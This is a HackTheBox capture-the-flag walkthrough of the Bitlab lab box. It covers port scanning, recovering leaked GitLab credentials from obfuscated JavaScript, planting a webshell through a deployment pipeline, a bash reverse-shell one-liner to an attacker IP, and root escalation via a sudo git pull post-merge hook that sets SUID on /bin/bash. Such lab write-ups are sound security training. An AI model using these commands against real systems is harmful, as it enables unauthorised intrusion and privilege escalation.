---
description: Bitlab box from HackTheBox write up.
---

# Bitlab

## Nmap

As always a port scan to see where we start:

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate=1000 10.10.10.114    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 15:59 CET
Nmap scan report for 10.10.10.114
Host is up (0.039s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 115.16 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sC -sV 10.10.10.114
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-28 16:03 CET
Nmap scan report for 10.10.10.114
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a23bb0dd2891bfe8f9308231232f9218 (RSA)
|   256 e63bfbb37f9a35a8bdd0277b25d4eddc (ECDSA)
|_  256 c9543d91017803ab16146bccf0b73a55 (ED25519)
80/tcp open  http    nginx
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.114/users/sign_in
| http-robots.txt: 55 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.07 seconds
```

## Port 80

### Our way in

This is a GitLab installation. By bruteforcing directories I found two registered users: `root` and `clave`. The rest of the directories were not interesting... until I clicked the help section.

In the `/help` directory, I found a directory listing with bookmarks. One of them was actually executing obfuscated javascript. After working on it for a bit, this is the code but readable:

```js
        (function() {
    var values = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
    document[values[2]](values[1])[values[0]] = values[3];
    document[values[2]](values[4])[values[0]] = values[5];
})()
" ADD_DATE="
1554932142
```

Basically, this is trying to fill the login details for the user `clave`. We have credentials to login into GitLAB now! `clave:11des0081x`.

### Logged in as clave

Now we can explore the non public repositories. I found this snipped with what could be credentials for an internal database, I will let this here just in case.

```php
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
```

Then, remember when I said the directory brute force did not really discover important things? Well now I found that these pages are my way in:

```
http://10.10.10.114/profile
http://10.10.10.114/deployer/
```

Both applications have its repository in the GitLab page.The Deployer thing basically allows me to deploy new merged changes to the master branch of the Profile repository. Since we are allowed to push changes to the Profile `test-deploy` branch, I uploaded a webshell to the branch and I merged this changes into the master branch.

My new "feature" was deployed without me actually using the Deployer application so... thanks to the administrator I guess. We can now get a reverse shell into the machine by accesing the webshell I uploaded in `http://10.10.10.114/profile/test.php` and executing:

```bash
bash -c "/bin/bash -i >& /dev/tcp/10.10.14.25/8000 0>&1"
```

Remember that you need to prepare a listener in your machine!

## Pwned!

Inmediately I executed this:

```bash
www-data@bitlab:/var/www$ sudo -l
Matching Defaults entries for www-data on bitlab:
    env_reset, exempt_group=sudo, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bitlab:
    (root) NOPASSWD: /usr/bin/git pull
```

As I expected, we can execute the `git pull` command as `root` (The Deployer application code is using `sudo`). 

There is something called hooks in Git that allows us to basically execute a task when something happens. We can execute as `root` the pull action, so the code inside a `post-merge` hook will run as `root`:

```bash
#! /bin/bash

chmod u+s /bin/bash
```

Of course we cannot do this in the original directory because it is owned by `root`, so we have to copy the repository to, for example, `/tmp` and create the hook there. The hook will covert the `/bin/bash` binary into a SUID binary we can use to escalate. In order for the hook to execute however, we need new changes in the upstream but that is not a problem since we can repeat what we did with the webshell but modifying the `README.md ` file or whatever.

Once everything is ready, pull the changes into our malicious repository and the box is pwned!

```bash
www-data@bitlab:/tmp/profile$ sudo /usr/bin/git pull
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 2), reused 1 (delta 0)
Unpacking objects: 100% (4/4), done.
From ssh://localhost:3022/root/profile
   c569005..6870424  master      -> origin/master
   4f20db1..5ccecd4  test-deploy -> origin/test-deploy
Updating c569005..6870424
Fast-forward
 README.md | 3 +--
 1 file changed, 1 insertion(+), 2 deletions(-)
www-data@bitlab:/tmp/profile$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
www-data@bitlab:/tmp/profile$ bash -p
bash-4.4# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

We could have also used this method but with a master and a slave repository so everything is self contained. Check this repository for an example: https://github.com/arnav-t/git-pull-priv-escalation.
